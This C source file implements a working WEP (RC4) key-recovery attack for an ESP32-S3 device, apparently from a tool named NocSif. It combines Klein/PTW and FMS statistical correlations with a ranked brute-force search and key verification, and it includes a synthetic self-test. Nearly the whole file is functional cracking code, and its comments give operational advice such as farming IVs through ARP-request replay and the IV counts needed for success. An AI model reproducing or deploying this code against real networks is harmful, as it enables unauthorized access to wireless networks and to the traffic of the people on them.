/*
 * NocSif — WEP (RC4) key recovery, portable statistics core.  See wep_recover.h for the API and
 * how the caller derives keystream bytes.  Pure C99, no platform dependency.
 *
 * ============================================================================================
 *  ALGORITHM (all cross-referenced to the public literature)
 * ============================================================================================
 * The RC4 key of a WEP packet is  key = IV(3 bytes) || SECRET(5 or 13 bytes).  Recovery votes
 * each secret byte from a bias between the keystream and the RC4 key-scheduling state, then
 * brute-forces the top-ranked candidates and verifies the assembled key against captured frames.
 *
 * (1) KLEIN correlation  — primary; every unique IV votes.
 *     [A. Klein, "Attacks on the RC4 stream cipher", 2008; Tews/Weinmann/Pyshkin 2007]
 *     To recover key byte at RC4 index l (l = 3..key_len+2), with the earlier key bytes known
 *     (the IV plus the secret bytes fixed so far), run the KSA for its first l steps to obtain
 *     the permutation S and running index j at that point, then
 *         K[l]  =  ( S^-1[ (l - keystream[l-1]) mod 256 ]  -  S[l]  -  j )  mod 256
 *     holds with probability ~1.37/256 (vs 1/256 at random).  Note it uses the (l-1)-th
 *     keystream byte.  Because the earlier bytes are fixed, S/j are EXACT (no approximation),
 *     so the bias is uniform across byte positions — this is what makes recovery converge.
 *
 * (2) FMS correlation  — secondary contributor; only "weak" IVs vote.
 *     [Fluhrer, Mantin, Shamir, "Weaknesses in the Key Scheduling Algorithm of RC4", 2001]
 *     For the same index l, an IV of the weak form (l, 255, X) (i.e. FMS "(A+3, N-1, X)" with
 *     A = l-3) leaks the byte through the FIRST keystream byte:
 *         K[l]  =  ( S^-1[ keystream[0] ]  -  S[l]  -  j )  mod 256      (prob ~5% per weak IV)
 *     Both correlations share the same run-KSA-to-step-l state, so one KSA pass yields both.
 *     Weak IVs are rare in random IV streams but common in some sequential counters — hence FMS
 *     is complementary, not the main path.
 *
 * (3) Ranking + fudge brute-force + verification.
 *     [aircrack-ng PTW: the "fudge factor"]  At each byte we keep the top `fudge` candidates by
 *     vote (those standing above the statistical noise floor) and recurse; a wrong prefix yields
 *     a flat vote table (nothing above the floor) and is pruned immediately.  When a full key is
 *     assembled it is verified by re-encrypting held-out samples (RC4(IV||key)[0] must equal the
 *     captured keystream[0]); a few held-out samples make a false accept astronomically unlikely.
 *
 * ============================================================================================
 *  UNIQUE-IV COUNTS (uniform-random IVs; measured against a synthetic RC4 model, and by compiling
 *  and running the self-test at the bottom of this file)
 * ============================================================================================
 *   Every unique IV contributes a vote; duplicate IVs add nothing (deduplicated on input).  With
 *   ENOUGH IVs the true byte is the clear top vote at each step and a pass locks the key in ~key_len
 *   nodes (a fraction of a second on a PC, a few seconds on the S3).  Below that the search fans out
 *   and a pass may hit its node cap and return NEED_MORE — keep farming IVs and call again.
 *     104-bit:  ~85k can recover but may fan out; ~100k+ is the fast path (locks in a handful of
 *               nodes).  [The classic PTW figures are ~40k => 50%, ~85k => 95% given a PC's compute.]
 *      40-bit:  ~40-50k is comfortable and fast.
 *   ARP-request replay is the standard way to farm unique IVs quickly on a quiet network.
 *
 * ============================================================================================
 *  MEMORY / CPU (bounded; no allocation after ctx_init)
 * ============================================================================================
 *   Sample store: max_samples * 19 bytes (iv[3] + kept keystream[15] + ks_len).  ~1.9 MB for the
 *     100k default — size it in PSRAM (see WEP_RECOVER_MALLOC below).  This is the bulk.
 *   Dedup set:    next_pow2(2*max_samples) * 4 bytes  (~1 MB for the default).
 *   Recovery working set: a few 256-byte tables on the worker stack (the "tens of KB" tables).
 *   The recovery pass is CPU-bound (KSA replays), completes in seconds-to-tens-of-seconds on a
 *   240 MHz Xtensa, never blocks, and does no allocation.
 */

#include "wep_recover.h"

#include <stdlib.h>
#include <string.h>

/* The two big buffers (sample store + dedup set) are multi-MB, so on the ESP32-S3 they MUST come
 * from PSRAM, never the scarce internal heap.  On-device (ESP_PLATFORM) we default to the PSRAM
 * caps allocator; a host build (self-test) stays pure stdlib.  Either can be overridden by defining
 * WEP_RECOVER_MALLOC / WEP_RECOVER_FREE before this file is compiled. */
#if !defined(WEP_RECOVER_MALLOC) && defined(ESP_PLATFORM)
#  include "esp_heap_caps.h"
#  define WEP_RECOVER_MALLOC(sz)  heap_caps_malloc((sz), MALLOC_CAP_SPIRAM)
#  define WEP_RECOVER_FREE(p)     heap_caps_free((p))
#endif
#ifndef WEP_RECOVER_MALLOC
#  define WEP_RECOVER_MALLOC(sz)  malloc(sz)
#endif
#ifndef WEP_RECOVER_FREE
#  define WEP_RECOVER_FREE(p)     free(p)
#endif

/* ---- tunables (compile-time) -------------------------------------------------------------- */
#define WEP_SAMPLE_STRIDE   (WEP_IV_LEN + WEP_SAMPLE_KS_KEEP + 1)  /* iv[3] + ks[15] + ks_len   */
#define WEP_KS_LEN_OFF      (WEP_IV_LEN + WEP_SAMPLE_KS_KEEP)      /* offset of ks_len in a slot */
#define WEP_FMS_WEIGHT      8u        /* a weak-IV FMS vote counts as this many Klein votes      */
#define WEP_HOLDOUT         24u       /* held-out samples used to verify an assembled key        */
#define WEP_PRUNE_NUM       27        /* prune threshold = mean + (NUM/DEN)*sqrt(mean) ...        */
#define WEP_PRUNE_DEN       10        /*  ... = mean + 2.7*std; keeps the true byte, kills flats  */

/* Each search node re-votes every sample (a KSA replay each), so nodes are the cost. With enough
 * unique IVs the true byte is the clear top vote at every step and recovery walks straight down
 * (~key_len nodes).  Only UNDER-sampled captures fan out; we cap that so a pass stays bounded
 * (~a minute on a 240 MHz Xtensa) and returns NEED_MORE instead of grinding — the caller keeps
 * farming IVs and retries, and once past the fast-path count (~100k for 104-bit) it locks in a
 * handful of nodes. */
#define WEP_MAX_NODES       200u      /* hard cap on search nodes per pass                        */

/* Target unique-IV counts for the progress readout. */
#define WEP_TARGET_IVS_104  85000u
#define WEP_TARGET_IVS_40   22000u

/* =========================================================================================== */
/*  RC4 primitives                                                                             */
/* =========================================================================================== */

/* Run the KSA for its first `l` steps on a key whose first `l` bytes are `key[0..l-1]`
 * (l <= 16, so the key never wraps within these steps).  Leaves S = permutation after step l-1,
 * *jout = the running index j after step l-1. */
static void rc4_ksa_prefix(const uint8_t *key, int l, uint8_t S[256], uint8_t *jout)
{
    int i;
    uint8_t j = 0;
    for (i = 0; i < 256; i++) S[i] = (uint8_t)i;
    for (i = 0; i < l; i++) {
        uint8_t t;
        j = (uint8_t)(j + S[i] + key[i]);
        t = S[i]; S[i] = S[j]; S[j] = t;
    }
    *jout = j;
}

/* Full RC4: KSA over the whole key (length klen, repeated) + first PRGA output byte. */
static uint8_t rc4_first_byte(const uint8_t *key, int klen)
{
    uint8_t S[256];
    int i;
    uint8_t j = 0, a, b, t;
    for (i = 0; i < 256; i++) S[i] = (uint8_t)i;
    for (i = 0; i < 256; i++) {
        j = (uint8_t)(j + S[i] + key[i % klen]);
        t = S[i]; S[i] = S[j]; S[j] = t;
    }
    /* PRGA step 1 */
    a = S[1];
    t = S[1]; S[1] = S[a]; S[a] = t;      /* swap S[1], S[S[1]] */
    b = (uint8_t)(S[1] + S[a]);
    return S[b];
}

/* =========================================================================================== */
/*  small helpers                                                                              */
/* =========================================================================================== */

static uint32_t next_pow2(uint32_t x)
{
    uint32_t p = 1;
    while (p < x) p <<= 1;
    return p;
}

static uint32_t isqrt32(uint32_t x)
{
    uint32_t r = 0, bit = 1u << 30;
    while (bit > x) bit >>= 2;
    while (bit) {
        if (x >= r + bit) { x -= r + bit; r = (r >> 1) + bit; }
        else              { r >>= 1; }
        bit >>= 2;
    }
    return r;
}

static uint32_t iv_key24(const uint8_t iv[3])
{
    return (uint32_t)iv[0] | ((uint32_t)iv[1] << 8) | ((uint32_t)iv[2] << 16);
}

/* dedup set: returns true if `k24` was newly inserted, false if already present. */
static bool seen_insert(wep_recover_ctx_t *ctx, uint32_t k24)
{
    uint32_t h = (k24 * 2654435761u) & ctx->seen_mask;
    for (;;) {
        uint32_t v = ctx->seen[h];
        if (v == 0xFFFFFFFFu) { ctx->seen[h] = k24; ctx->seen_count++; return true; }
        if (v == k24) return false;
        h = (h + 1) & ctx->seen_mask;
    }
}

/* =========================================================================================== */
/*  lifecycle                                                                                  */
/* =========================================================================================== */

bool wep_recover_ctx_init_cfg(wep_recover_ctx_t *ctx, const wep_recover_cfg_t *cfg)
{
    uint32_t seen_cap, i;
    if (!ctx) return false;
    memset(ctx, 0, sizeof(*ctx));

    ctx->cfg.key_len     = cfg ? cfg->key_len : 0;
    ctx->cfg.max_samples = (cfg && cfg->max_samples) ? cfg->max_samples : WEP_RECOVER_DEFAULT_MAX_SAMPLES;
    ctx->cfg.fudge       = (cfg && cfg->fudge)       ? cfg->fudge       : WEP_RECOVER_DEFAULT_FUDGE;
    ctx->cfg.max_verify  = (cfg && cfg->max_verify)  ? cfg->max_verify  : WEP_RECOVER_DEFAULT_MAX_VERIFY;
    if (ctx->cfg.key_len != WEP_KEY40_LEN && ctx->cfg.key_len != WEP_KEY104_LEN)
        ctx->cfg.key_len = 0;                       /* auto */
    if (ctx->cfg.fudge > 64) ctx->cfg.fudge = 64;

    ctx->cap_samples = ctx->cfg.max_samples;
    ctx->samples = (uint8_t *)WEP_RECOVER_MALLOC((size_t)ctx->cap_samples * WEP_SAMPLE_STRIDE);
    if (!ctx->samples) { wep_recover_ctx_free(ctx); return false; }

    seen_cap = next_pow2(ctx->cap_samples * 2u);
    if (seen_cap < 1024u) seen_cap = 1024u;
    ctx->seen = (uint32_t *)WEP_RECOVER_MALLOC((size_t)seen_cap * sizeof(uint32_t));
    if (!ctx->seen) { wep_recover_ctx_free(ctx); return false; }
    ctx->seen_mask = seen_cap - 1u;
    for (i = 0; i < seen_cap; i++) ctx->seen[i] = 0xFFFFFFFFu;

    ctx->inited = true;
    return true;
}

bool wep_recover_ctx_init(wep_recover_ctx_t *ctx)
{
    return wep_recover_ctx_init_cfg(ctx, NULL);
}

void wep_recover_ctx_free(wep_recover_ctx_t *ctx)
{
    if (!ctx) return;
    if (ctx->samples) WEP_RECOVER_FREE(ctx->samples);
    if (ctx->seen)    WEP_RECOVER_FREE(ctx->seen);
    ctx->samples = NULL;
    ctx->seen = NULL;
    ctx->n_samples = 0;
    ctx->seen_count = 0;
    ctx->inited = false;
}

void wep_recover_reset(wep_recover_ctx_t *ctx)
{
    uint32_t i, seen_cap;
    if (!ctx || !ctx->inited) return;
    ctx->n_samples = 0;
    ctx->seen_count = 0;
    ctx->budget_used = 0;
    seen_cap = ctx->seen_mask + 1u;
    for (i = 0; i < seen_cap; i++) ctx->seen[i] = 0xFFFFFFFFu;
}

void wep_recover_set_yield(wep_recover_ctx_t *ctx, void (*fn)(void *), void *arg)
{
    if (!ctx) return;
    ctx->yield_fn = fn;
    ctx->yield_arg = arg;
}

/* ~64k samples of voting between cooperative yields (bounds the WDT-feed interval on an RTOS). */
#define WEP_YIELD_EVERY 65536u

/* =========================================================================================== */
/*  feeding samples                                                                            */
/* =========================================================================================== */

wep_add_result_t wep_recover_add_sample(wep_recover_ctx_t *ctx,
                                        const uint8_t iv[WEP_IV_LEN],
                                        const uint8_t *keystream, uint8_t ks_len)
{
    uint8_t *slot;
    uint32_t k24;
    uint8_t keep;
    if (!ctx || !ctx->inited || !iv || !keystream || ks_len < 1) return WEP_ADD_BADARG;
    if (ctx->n_samples >= ctx->cap_samples) return WEP_ADD_FULL;

    k24 = iv_key24(iv);
    if (!seen_insert(ctx, k24)) return WEP_ADD_DUP;

    slot = ctx->samples + (size_t)ctx->n_samples * WEP_SAMPLE_STRIDE;
    slot[0] = iv[0]; slot[1] = iv[1]; slot[2] = iv[2];
    keep = ks_len < WEP_SAMPLE_KS_KEEP ? ks_len : (uint8_t)WEP_SAMPLE_KS_KEEP;
    memcpy(slot + WEP_IV_LEN, keystream, keep);
    if (keep < WEP_SAMPLE_KS_KEEP)
        memset(slot + WEP_IV_LEN + keep, 0, (size_t)(WEP_SAMPLE_KS_KEEP - keep));
    slot[WEP_KS_LEN_OFF] = keep;
    ctx->n_samples++;
    return WEP_ADD_ADDED;
}

uint32_t wep_recover_unique_ivs(const wep_recover_ctx_t *ctx)
{
    return (ctx && ctx->inited) ? ctx->n_samples : 0;
}

uint8_t wep_recover_progress(const wep_recover_ctx_t *ctx)
{
    uint32_t target, pct;
    if (!ctx || !ctx->inited) return 0;
    target = (ctx->cfg.key_len == WEP_KEY40_LEN) ? WEP_TARGET_IVS_40 : WEP_TARGET_IVS_104;
    pct = (uint32_t)((uint64_t)ctx->n_samples * 100u / target);
    return (uint8_t)(pct > 100u ? 100u : pct);
}

/* =========================================================================================== */
/*  recovery                                                                                   */
/* =========================================================================================== */

typedef struct {
    wep_recover_ctx_t *ctx;
    uint8_t   key_len;          /* 5, 13, or 0 for auto (descend to 13, verify at 5 and 13)      */
    uint8_t   fudge;
    uint32_t  max_verify;
    uint32_t  nodes;
    uint32_t  verifies;
    /* held-out verification set: (iv, ks0), copied out for locality */
    uint32_t  n_hold;
    uint8_t   hold_iv[WEP_HOLDOUT][3];
    uint8_t   hold_ks0[WEP_HOLDOUT];
    uint8_t   found_key[WEP_KEY_MAX_LEN];
    uint8_t   found_len;
} wep_search_t;

/* Vote every stored sample for secret byte index b (RC4 index l=b+3), given the fixed prefix
 * secret[0..b-1] in `guess`.  votes[] (256) is filled with Klein (all samples) + FMS (weak IVs).*/
static void vote_byte(wep_search_t *s, const uint8_t *guess, int b, uint32_t votes[256])
{
    wep_recover_ctx_t *ctx = s->ctx;
    const int l = b + 3;
    uint8_t key[WEP_KEY_MAX_LEN + WEP_IV_LEN];
    uint8_t S[256], inv[256], j;
    uint32_t n = ctx->n_samples, idx;

    memset(votes, 0, 256 * sizeof(uint32_t));
    /* the fixed part of the per-sample key past the IV */
    for (idx = 0; idx < (uint32_t)b; idx++) key[WEP_IV_LEN + idx] = guess[idx];

    for (idx = 0; idx < n; idx++) {
        const uint8_t *slot = ctx->samples + (size_t)idx * WEP_SAMPLE_STRIDE;
        uint8_t ks_len = slot[WEP_KS_LEN_OFF];
        int i;
        if (ctx->yield_fn && ++ctx->yield_ctr >= WEP_YIELD_EVERY) {
            ctx->yield_ctr = 0;
            ctx->yield_fn(ctx->yield_arg);
        }
        key[0] = slot[0]; key[1] = slot[1]; key[2] = slot[2];
        rc4_ksa_prefix(key, l, S, &j);
        for (i = 0; i < 256; i++) inv[S[i]] = (uint8_t)i;

        /* Klein: needs keystream[l-1] */
        if (ks_len >= (uint8_t)l) {
            uint8_t arg = (uint8_t)(l - slot[WEP_IV_LEN + (l - 1)]);
            uint8_t c = (uint8_t)(inv[arg] - S[l] - j);
            votes[c] += 1u;
        }
        /* FMS: weak IV (l, 255, X) uses keystream[0] */
        if (slot[0] == (uint8_t)l && slot[1] == 0xFF) {
            uint8_t c = (uint8_t)(inv[slot[WEP_IV_LEN + 0]] - S[l] - j);
            votes[c] += WEP_FMS_WEIGHT;
        }
    }
}

/* Verify a fully-assembled key (IV||secret) against the held-out samples. */
static bool verify_key(wep_search_t *s, const uint8_t *secret, int klen_secret)
{
    uint8_t key[WEP_KEY_MAX_LEN + WEP_IV_LEN];
    int klen = klen_secret + WEP_IV_LEN;
    uint32_t h;
    int k;
    s->verifies++;
    for (k = 0; k < klen_secret; k++) key[WEP_IV_LEN + k] = secret[k];
    for (h = 0; h < s->n_hold; h++) {
        key[0] = s->hold_iv[h][0]; key[1] = s->hold_iv[h][1]; key[2] = s->hold_iv[h][2];
        if (rc4_first_byte(key, klen) != s->hold_ks0[h]) return false;
    }
    return s->n_hold > 0;   /* need at least one held-out sample to trust a match */
}

/* Depth-first recursive recovery.  `guess` holds the secret bytes fixed so far (length b). */
static bool search(wep_search_t *s, uint8_t *guess, int b, uint32_t votes_scratch[][256])
{
    uint32_t *votes = votes_scratch[b];
    uint32_t total, mean, std, cut;
    int i, order[256], ncand, c;

    if (s->nodes >= WEP_MAX_NODES || s->verifies >= s->max_verify) return false;
    s->nodes++;
    if (s->ctx->yield_fn) s->ctx->yield_fn(s->ctx->yield_arg);   /* let idle/UI run between nodes */

    /* auto/40-bit: a verified 5-byte key ends it at depth 5 */
    if (b == WEP_KEY40_LEN && (s->key_len == 0 || s->key_len == WEP_KEY40_LEN)) {
        if (verify_key(s, guess, WEP_KEY40_LEN)) {
            memcpy(s->found_key, guess, WEP_KEY40_LEN); s->found_len = WEP_KEY40_LEN; return true;
        }
        if (s->key_len == WEP_KEY40_LEN) return false;      /* 40-bit only: stop here */
    }
    /* auto/104-bit: a verified 13-byte key ends it at depth 13 */
    if (b == WEP_KEY104_LEN) {
        if (s->key_len == 0 || s->key_len == WEP_KEY104_LEN) {
            if (verify_key(s, guess, WEP_KEY104_LEN)) {
                memcpy(s->found_key, guess, WEP_KEY104_LEN); s->found_len = WEP_KEY104_LEN; return true;
            }
        }
        return false;
    }

    vote_byte(s, guess, b, votes);

    /* statistical floor: under a wrong prefix the table is ~flat (mean, std≈sqrt(mean)); the
     * true byte stands ~0.37*mean above it once enough IVs are in. */
    total = 0;
    for (i = 0; i < 256; i++) total += votes[i];
    mean = total >> 8;
    std  = isqrt32(mean ? mean : 1);
    cut  = mean + (uint32_t)((WEP_PRUNE_NUM * std) / WEP_PRUNE_DEN);

    /* partial selection of the top `fudge` candidates by vote (simple, 256 is tiny) */
    ncand = 0;
    {
        uint8_t used[256];
        memset(used, 0, sizeof(used));
        for (c = 0; c < (int)s->fudge; c++) {
            int best = -1; uint32_t bestv = 0;
            for (i = 0; i < 256; i++) {
                if (!used[i] && votes[i] >= bestv) { bestv = votes[i]; best = i; }
            }
            if (best < 0) break;
            used[best] = 1;
            order[ncand++] = best;
        }
    }

    for (c = 0; c < ncand; c++) {
        int cand = order[c];
        /* Descend candidates that clear the noise floor (ranked desc, so once one is below the cut
         * the rest are too).  If even the top candidate is flat the prefix is wrong -> prune the
         * whole node.  A verified full key at a leaf is the real gate; this only bounds the fan-out. */
        if ((uint32_t)votes[cand] < cut) {
            if (c == 0) return false;   /* even the best is flat: wrong prefix */
            break;                      /* the remaining (lower) candidates are flat too */
        }
        guess[b] = (uint8_t)cand;
        if (search(s, guess, b + 1, votes_scratch)) return true;
    }
    return false;
}

wep_recover_status_t wep_recover_try(wep_recover_ctx_t *ctx,
                                     uint8_t *out_key, uint8_t *out_len,
                                     uint32_t *out_need_more)
{
    wep_search_t *s;
    uint8_t guess[WEP_KEY_MAX_LEN];
    uint32_t (*votes_scratch)[256];
    uint32_t h, target;
    bool ok;

    if (out_need_more) *out_need_more = 0;
    if (!ctx || !ctx->inited) return WEP_RECOVER_FAILED;

    /* enough to bother?  (very small captures never recover) */
    target = (ctx->cfg.key_len == WEP_KEY40_LEN) ? WEP_TARGET_IVS_40 : WEP_TARGET_IVS_104;
    if (ctx->n_samples < 2000u) {
        if (out_need_more) *out_need_more = (target > ctx->n_samples) ? target - ctx->n_samples : target;
        return WEP_RECOVER_NEED_MORE;
    }

    s = (wep_search_t *)WEP_RECOVER_MALLOC(sizeof(*s));
    votes_scratch = (uint32_t (*)[256])WEP_RECOVER_MALLOC(sizeof(uint32_t) * 256 * (WEP_KEY_MAX_LEN + 1));
    if (!s || !votes_scratch) {
        if (s) WEP_RECOVER_FREE(s);
        if (votes_scratch) WEP_RECOVER_FREE(votes_scratch);
        return WEP_RECOVER_FAILED;
    }
    memset(s, 0, sizeof(*s));
    s->ctx = ctx;
    s->key_len = ctx->cfg.key_len;
    s->fudge = ctx->cfg.fudge ? ctx->cfg.fudge : WEP_RECOVER_DEFAULT_FUDGE;
    s->max_verify = ctx->cfg.max_verify ? ctx->cfg.max_verify : WEP_RECOVER_DEFAULT_MAX_VERIFY;

    /* pick the held-out verification set (spread across the capture) */
    s->n_hold = ctx->n_samples < WEP_HOLDOUT ? ctx->n_samples : WEP_HOLDOUT;
    for (h = 0; h < s->n_hold; h++) {
        uint32_t si = (uint32_t)((uint64_t)h * ctx->n_samples / s->n_hold);
        const uint8_t *slot = ctx->samples + (size_t)si * WEP_SAMPLE_STRIDE;
        s->hold_iv[h][0] = slot[0]; s->hold_iv[h][1] = slot[1]; s->hold_iv[h][2] = slot[2];
        s->hold_ks0[h] = slot[WEP_IV_LEN + 0];
    }

    ok = search(s, guess, 0, votes_scratch);
    ctx->budget_used = s->verifies;

    if (ok) {
        if (out_key) memcpy(out_key, s->found_key, s->found_len);
        if (out_len) *out_len = s->found_len;
        WEP_RECOVER_FREE(votes_scratch);
        WEP_RECOVER_FREE(s);
        return WEP_RECOVER_RECOVERED;
    }

    WEP_RECOVER_FREE(votes_scratch);
    WEP_RECOVER_FREE(s);

    /* Not found: if the budget wasn't the wall, it's almost certainly too few IVs. */
    if (out_need_more)
        *out_need_more = (target > ctx->n_samples) ? (target - ctx->n_samples)
                                                   : (ctx->n_samples / 4u);   /* ask for ~25% more */
    return (ctx->n_samples < target) ? WEP_RECOVER_NEED_MORE : WEP_RECOVER_FAILED;
}

/* =========================================================================================== */
/*  SELF-TEST  (host build)                                                                     */
/*    cc -DWEP_RECOVER_SELFTEST -O2 wep_recover.c -o wep_selftest && ./wep_selftest             */
/* =========================================================================================== */
#ifdef WEP_RECOVER_SELFTEST
#include <stdio.h>
#include <time.h>

/* full RC4 keystream (first T bytes) for a known key — mirrors what a real capture yields */
static void rc4_keystream(const uint8_t *key, int klen, uint8_t *out, int T)
{
    uint8_t S[256]; int i; uint8_t a = 0, jj = 0, t;
    for (i = 0; i < 256; i++) S[i] = (uint8_t)i;
    { uint8_t j = 0; for (i = 0; i < 256; i++) { j = (uint8_t)(j + S[i] + key[i % klen]); t = S[i]; S[i] = S[j]; S[j] = t; } }
    for (i = 0; i < T; i++) {
        a = (uint8_t)(a + 1); jj = (uint8_t)(jj + S[a]);
        t = S[a]; S[a] = S[jj]; S[jj] = t;
        out[i] = S[(uint8_t)(S[a] + S[jj])];
    }
}

/* xorshift32 — deterministic IV/key generation so the test is reproducible */
static uint32_t xs = 0;
static uint32_t rnd(void){ xs ^= xs<<13; xs ^= xs>>17; xs ^= xs<<5; return xs; }

static int run_case(int secret_len, uint32_t n_ivs, uint32_t seed, int inject_weak)
{
    wep_recover_cfg_t cfg;
    wep_recover_ctx_t ctx;
    uint8_t secret[WEP_KEY104_LEN];
    uint8_t out[WEP_KEY_MAX_LEN], outlen = 0;
    uint32_t need = 0, made = 0, weak = 0;
    int i;
    clock_t t0;
    wep_recover_status_t st;

    xs = seed ? seed : 1;
    for (i = 0; i < secret_len; i++) secret[i] = (uint8_t)(rnd() >> 7);

    memset(&cfg, 0, sizeof(cfg));
    cfg.key_len = (uint8_t)secret_len;    /* pin the length for a fast, deterministic test */
    cfg.max_samples = n_ivs + 16;
    if (!wep_recover_ctx_init_cfg(&ctx, &cfg)) { printf("  OOM\n"); return 0; }

    while (made < n_ivs) {
        uint8_t iv[3], key[WEP_KEY104_LEN + 3], ks[24];
        int L = secret_len + 3, kk;
        /* mostly random IVs; optionally sprinkle FMS-weak IVs (l,255,X) to exercise that path */
        if (inject_weak && (rnd() & 7u) == 0u) {
            int l = 3 + (int)(rnd() % (uint32_t)secret_len);
            iv[0] = (uint8_t)l; iv[1] = 0xFF; iv[2] = (uint8_t)(rnd() >> 9); weak++;
        } else {
            iv[0] = (uint8_t)(rnd() >> 9); iv[1] = (uint8_t)(rnd() >> 5); iv[2] = (uint8_t)(rnd() >> 1);
        }
        key[0] = iv[0]; key[1] = iv[1]; key[2] = iv[2];
        for (kk = 0; kk < secret_len; kk++) key[3 + kk] = secret[kk];
        rc4_keystream(key, L, ks, secret_len + 3);   /* need keystream[0..secret_len+1] */
        if (wep_recover_add_sample(&ctx, iv, ks, (uint8_t)(secret_len + 3)) == WEP_ADD_ADDED) made++;
    }

    printf("  %d-bit  uniqueIVs=%u weakIVs=%u progress=%u%% ... ",
           secret_len == 5 ? 40 : 104, wep_recover_unique_ivs(&ctx), weak, wep_recover_progress(&ctx));
    fflush(stdout);

    t0 = clock();
    st = wep_recover_try(&ctx, out, &outlen, &need);
    double dt = (double)(clock() - t0) / CLOCKS_PER_SEC;

    int pass = (st == WEP_RECOVER_RECOVERED && outlen == secret_len &&
                memcmp(out, secret, secret_len) == 0);
    printf("%s  (%.2fs, verifies=%llu)\n", pass ? "RECOVERED [OK]" :
           (st == WEP_RECOVER_RECOVERED ? "RECOVERED-WRONG" :
            (st == WEP_RECOVER_NEED_MORE ? "NEED_MORE" : "FAILED")),
           dt, (unsigned long long)ctx.budget_used);
    if (!pass && st == WEP_RECOVER_RECOVERED) {
        printf("    got  "); for (i=0;i<outlen;i++) printf("%02x", out[i]); printf("\n");
        printf("    want "); for (i=0;i<secret_len;i++) printf("%02x", secret[i]); printf("\n");
    }
    wep_recover_ctx_free(&ctx);
    return pass;
}

int main(void)
{
    int ok = 0, total = 0;
    printf("WEP key-recovery self-test (synthetic RC4 samples from a known key)\n");
    printf("40-bit:\n");
    ok += run_case(5,  50000, 0x1234, 0); total++;
    ok += run_case(5,  50000, 0x99A1, 1); total++;   /* with FMS-weak IVs mixed in */
    printf("104-bit:\n");
    ok += run_case(13, 100000, 0xC0FFEE, 0); total++;
    ok += run_case(13, 120000, 0xBEEF01, 0); total++;
    ok += run_case(13, 120000, 0x5EED77, 1); total++;   /* with FMS-weak IVs mixed in */
    printf("\n%d/%d cases recovered the exact key.\n", ok, total);
    return ok == total ? 0 : 1;
}
#endif /* WEP_RECOVER_SELFTEST */
